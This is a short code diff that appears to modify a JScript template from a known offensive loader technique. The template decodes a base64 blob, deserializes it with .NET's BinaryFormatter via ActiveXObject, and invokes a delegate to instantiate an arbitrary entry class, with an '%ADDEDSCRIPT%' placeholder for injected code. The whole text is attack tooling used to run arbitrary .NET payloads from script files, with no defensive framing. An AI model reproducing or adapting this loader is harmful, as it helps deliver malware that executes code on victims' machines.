@@ -18,9 +18,8 @@ try {
 	var stm = base64ToStream(serialized_obj);
 	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
 	var al = new ActiveXObject('System.Collections.ArrayList');
-	var n = fmt.SurrogateSelector;
 	var d = fmt.Deserialize_2(stm);
-	al.Add(n);
+	al.Add(undefined);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
 	%ADDEDSCRIPT%
 } catch (e) {
